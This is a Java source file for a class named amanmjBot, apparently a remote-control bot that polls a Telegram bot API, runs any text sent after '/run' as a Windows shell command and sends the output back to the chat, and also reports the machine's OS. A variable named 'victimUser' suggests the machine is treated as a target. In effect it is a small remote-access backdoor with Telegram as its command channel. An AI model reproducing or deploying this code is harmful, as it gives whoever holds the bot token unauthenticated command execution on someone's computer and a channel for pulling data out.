package PC_Remote_Controller;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.json.JSONArray;
import org.json.JSONObject;
/**
 *
 * @author Aman Mahajan
 */
public class amanmjBot extends Thread{
private final String url;
private final String userName;
private final String tokenID;
    public amanmjBot(String url, String tokenID) {
        this.url=url;
        this.tokenID=tokenID;
        this.userName="Aman Mahajan";
    }
    private void sendErrorMessage(Integer chatID) throws MalformedURLException, IOException, InterruptedException
    {
        System.out.println("error");
        String error="Command Not Recognized by AmanMj Bot...... Please Try Again";
        String URLtoHit=url+tokenID+"/sendMessage?chat_id="+chatID+"&text="+error;
        URL u=new URL(URLtoHit);
        HttpURLConnection conn=(HttpURLConnection)u.openConnection();
        conn.setDoInput(true);
        conn.setRequestMethod("POST");
        conn.connect();
        if(conn.getResponseCode()==200 || conn.getResponseCode()==201)
        {        
            System.out.println("success");            
        }
        
    }
    //sends message to bot returns message object of telegram
    private void sendUserAgent(Integer chatID) throws MalformedURLException, IOException
    {        
        String OS=this.userName+" is using "+System.getProperty("os.name");
        String URLtoHit=url+tokenID+"/sendMessage?chat_id="+chatID+"&text="+OS;
        URL u=new URL(URLtoHit);
        HttpURLConnection conn=(HttpURLConnection) u.openConnection();
        conn.setDoInput(true);
        conn.setRequestMethod("GET");
        conn.connect();         
        if(conn.getResponseCode()==200 || conn.getResponseCode()==201)
        {
            System.out.println("success");            
        }
    }
    private void runCMD(Integer chatID,String command) throws MalformedURLException, IOException, InterruptedException
    {
        Process p=Runtime.getRuntime().exec(new String[]{"cmd", "/c",command});   

        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String temp=null;
        long curr=System.currentTimeMillis();
        try
        {
            while ((temp = stdInput.readLine()) != null) 
            {   
                if(System.currentTimeMillis()-curr>=5000)
                    break;
                String URLtoHit=url+tokenID+"/sendMessage?chat_id="+chatID+"&text="+temp;
                
                URL u=new URL(URLtoHit);
                HttpURLConnection conn=(HttpURLConnection) u.openConnection();
                                
                conn.setDoInput(true);
                
                conn.setRequestMethod("GET");              
                
                conn.connect(); 
                
                if(conn.getResponseCode()==200 || conn.getResponseCode()==201)
                {
                    System.out.println("success");            
                }
                else
                    break;
            } 
        }
        catch(Exception e)
        {
            System.out.println("error");
            String URLtoHit=url+tokenID+"/sendMessage?chat_id="+chatID+"&text="+"unable to execute";
            URL u=new URL(URLtoHit);
            HttpURLConnection conn=(HttpURLConnection) u.openConnection();
            conn.setDoInput(true);
            conn.setRequestMethod("GET");
            conn.connect();         
            if(conn.getResponseCode()==200 || conn.getResponseCode()==201)
            {
                System.out.println("success");            
            }           
        }
        System.out.println("success");    
    }
    private JSONObject getUpdates(Integer offset) throws MalformedURLException, IOException
    {      
        String URLtoHit=url+tokenID+"/getUpdates"+"?offset="+offset;
      
        URL u=new URL(URLtoHit);
        HttpURLConnection conn=(HttpURLConnection )u.openConnection();
        conn.setDoInput(true);
        conn.setRequestMethod("GET");
        conn.connect();
        JSONObject json = null;
        if(conn.getResponseCode()==200 || conn.getResponseCode()==201)
        {
            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();

            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }
            br.close();
            json=new JSONObject(sb.toString());
        } 
        return json;        
    }
    
    @Override
    public void run() {
        Integer offset=1,chatID;
        String messageReceived,victimUser;
        JSONObject response;
        JSONArray result_array;
        
        while(true)
        {
            try {
                response=getUpdates(offset);
                result_array=response.getJSONArray("result");
               
                if(response==null)
                    continue;                
                
                if(result_array.length()==0)
                    continue;                     
                
                chatID=result_array.getJSONObject(0).getJSONObject("message").getJSONObject("chat").getInt("id");
                                
                messageReceived=result_array.getJSONObject(0).getJSONObject("message").getString("text");
                offset=result_array.getJSONObject(0).getInt("update_id")+1;
                
                
                if(messageReceived.length()<6)
                {
                    sendErrorMessage(chatID);
                    continue;
                }
                
                
                if(messageReceived.length()>10)
                {
                    if(messageReceived.substring(0,10).equals("/getUserOS"))
                    {
                        if(messageReceived.substring(11).equals(this.userName)==true)
                        {
                            sendUserAgent(chatID);
                            continue;
                        }
                    }
                                      
                }
                if(messageReceived.substring(0,4).equals("/run"))
                {    
                    String command=messageReceived.substring(5);
                    runCMD(chatID,command);
                }                
                else
                {
                    sendErrorMessage(chatID);
                }   

                
                Thread.sleep(4000);
            } 
            catch (Exception ex) {
                   
                Logger.getLogger(amanmjBot.class.getName()).log(Level.SEVERE, null, ex);
            }         
        }           
    }
}
